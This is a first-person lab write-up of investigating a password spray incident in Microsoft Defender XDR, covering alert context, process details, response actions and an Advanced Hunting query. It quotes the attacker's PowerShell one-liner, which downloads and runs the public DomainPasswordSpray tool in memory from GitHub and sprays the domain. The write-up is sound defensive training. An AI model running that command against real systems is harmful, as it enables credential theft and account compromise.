# XDR: Credential Access

## Overview

This report documents investigating a Credential Access incident in Microsoft Defender XDR — a password spray attack carried out via a PowerShell script pulled from a public GitHub tool. The lab scenario: the security team received multiple alerts for failed sign-in attempts and a suspicious login from an unfamiliar IP, requiring investigation of a potential password spray attack, identification of the affected account(s), and a summary of findings for senior analysts. Device and user account details match the same lab environment used in the previous XDR investigations (vm-evil-xdr / vm-evil-xdr\evil-xdr).

## Investigation

### Step 1: Locate the Alert and Review Incident Context

I opened the Incidents & alerts blade, set the time range to 6 months, and located the incident "Hands-on keyboard attack was launched from a compromised account (attack disruption)" (Incident ID: 119). It was flagged as a top-priority, multi-alert incident — 9 correlated alerts across 2 assets — with priority factors including password spraying, blocked lateral movement over RDP, and a compromised account conducting a hands-on-keyboard attack. At the incident level, three MITRE techniques stood out: System Service Discovery (T1007), Remote Desktop Protocol (T1021.001), and System Network Configuration Discovery (T1016).

Within the alert list, I selected the "Password spraying" alert to begin the investigation. Its details showed: Category — Credential access, MITRE ATT&CK Technique — T1110 (Brute Force), Detection source — EDR, Severity — Medium.

[SCREENSHOT: Incidents queue showing the flagged multi-alert incident with Lateral Movement and Attack Disruption tags]

### Step 2: Review the Alert Timeline and Script Content

Switching to the Alert timeline surfaced the flagged event: `powershell.exe` executed a script, recorded at 5:28:31 PM. Reviewing the full script content:

```powershell
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password ********** -Domain $Env:USERDOMAIN -Force}
```

[SCREENSHOT: Alert timeline showing the powershell.exe executed a script event with AMSI content]

This script forces the TLS 1.2 protocol, then uses `IEX`/`IWR` to download and execute DomainPasswordSpray — a known, publicly available password spraying tool — directly from GitHub, and immediately invokes it against the current domain with a supplied password. This is the same fileless, in-memory execution pattern seen in the earlier Execution investigation, applied here toward credential access instead of a generic post-exploitation payload.

### Step 3: Review the Process Execution Details

Expanding the initiating process on the flagged event showed:
- Process ID: 2760
- Execution details: Token elevation Default, Integrity level High
- Image file path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- Image file SHA1 hash, creation and modification time: Dec 6, 2025, 8:20:22 PM
- Remote session initiator device name: LAPTOP-FKQ39MRR
- User: vm-evil-xdr\evil-xdr

### Step 4: Response Actions

Based on the investigation, this alert was confirmed malicious. Available response actions:
- Run Antivirus Scan
- Restrict App Execution on the machine
- Initiate Automated Investigation
- Initiate Live Response Session for manual remote intervention
- Isolate Device to prevent lateral movement or further access to other devices

[SCREENSHOT: Device action menu showing response options including Isolate Device]

### Step 5: Advanced Hunting

For deeper investigation, I used the Go hunt option to pivot into Advanced Hunting with a pre-built KQL query scoped to the affected device:

```kql
let deviceName = "vm-evil-xdr";
let deviceId = "fc78d839ec1119595f4f097dd6378866d634e767";
search in (DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceRegistryEvents, DeviceLogonEvents, DeviceImageLoadEvents, DeviceEvents)
Timestamp between (ago(7d) .. now())
and (DeviceName == deviceName
//or DeviceId == deviceId
// Events affecting this target device
//or RemoteDeviceName == deviceName
)
```

This query searches across multiple device event tables for the top 100 events tied to the affected machine over the last 7 days, giving a broader activity timeline beyond just the flagged alert.

[SCREENSHOT: Advanced Hunting query results with timeline visualization showing an activity spike]

## Key Takeaways

- A password spray attack executed via a fileless PowerShell script follows the same detection pattern as other fileless techniques — the tool itself (DomainPasswordSpray) is publicly documented, which makes the downloaded script a fast, high-confidence indicator once the URL is checked.
- Credential access alerts benefit from incident-level context — this single Password spraying alert was one of nine correlated alerts in a broader attack disruption incident, which changes the response from "investigate one alert" to "contain a confirmed multi-stage compromise."
- The MITRE technique mapping (T1110 — Brute Force) at the alert level and the broader tactics (T1007, T1021.001, T1016) at the incident level tell two different parts of the story — the former is the specific action, the latter is the surrounding reconnaissance and lateral movement behavior.
- Pivoting into Advanced Hunting with a pre-scoped KQL query extends the investigation from "what triggered this one alert" to "what else happened on this device," which is essential before deciding on containment actions like isolation.

## Conclusion

I investigated a Credential Access alert involving a fileless PowerShell-based password spray attack (T1110), confirmed it as part of a broader nine-alert, attack-disruption incident, and used Advanced Hunting to extend visibility into the affected device before reviewing available containment actions.
